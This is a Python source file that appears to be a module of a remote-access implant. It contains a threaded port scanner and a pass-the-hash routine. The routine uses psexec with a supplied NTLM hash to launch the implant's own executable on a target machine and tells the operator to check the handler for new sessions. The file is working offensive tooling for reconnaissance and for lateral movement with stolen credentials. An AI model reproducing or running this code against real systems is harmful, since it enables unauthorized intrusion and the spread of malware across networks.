import logging
import Queue
import threading
import socket
from Crypto.Random import random # Already imported elsewhere so might as well use it
from common import *
import psexec
import ntpath
import sys

class Networking:
	"""
	Network discovery, port scans, etc.
	"""
	def __init__(self):
		self.shell = None
		
	def scan_host(self, host, ports, q):
		logging.debug("Starting portscan of host "+host+", ports: "+str(ports))
		random.shuffle(ports)
		for port in ports:
			try:
				s = socket.socket()
				s.settimeout(0.25)
				s.connect((host, int(port)))
				q.put((host, port))
			except:
				continue
				
	def portscan(self, a):
		q = Queue.Queue()
		hosts, ports = a.split()
		host_list = []
		port_list = []
		for i in ports.split(","):
			try:
				if '-' not in i:
					port_list.append(i)
				else:
					a, b = map(int, i.split('-'))
					port_list += range(a, b+1)
			except:
				return "Invalid port range"
				
		if not port_list or port_list[0] == []:
			return "Invalid port range"
				
		host_range = ".".join(hosts.split(".")[:3])
		try:
			for i in hosts.split(","):
				print i
				print hosts.split(".")
				if '-' not in i.split(".")[3]:
					host_list.append(host_range+"."+str(i.split(".")[3]))
				else:
					a, b = map(int, i.split(".")[3].split('-'))
					for c in range(a, b+1):
						host_list.append(host_range+"."+str(c))
		except Exception as e:
			return "[-]Invalid host range"
			
		if not host_list or host_list[0] == []:
			return "[-]Invalid host range"
				
		threads = []
		for host in host_list:
			t = threading.Thread(target=self.scan_host, args=(host, port_list, q))
			t.daemon = True
			t.start()
			threads.append(t)
			
		for t in threads:
			t.join()
			
		open = []
		while not q.empty():
			open.append(q.get())
			
		hosts = {}
		for host, port in open:
			if host not in hosts:
				hosts[host] = str(port)
			else:
				hosts[host] += ","+str(port)
			
		out = ""
		for host in hosts:
			out += host+":\n"
			for port in set(sorted(hosts[host].split(","))):
				out += "  "+str(port)+" OPEN\n"
			out += "\n"
			
		return out # This is absolutely horrible but I don't see how it can be improved
		
	@windows_only
	def pass_the_hash(self, data):
		try:
			target, user, hash = data.split()
		except: return "[*]Usage: pth [target] [username] [hash]"
		
		try:
			psobj = psexec.PSEXEC('start "" '+ntpath.basename(sys.executable), "C:\\windows\\system32", None, ntpath.basename(sys.executable), username=user, hashes=hash)
			psobj.run(target)
		except Exception as e:
			return "[-]Error occured during passing: "+str(e) 
		
		return "[+]Looks good. Check for new sessions in the handler."
		
net = Networking()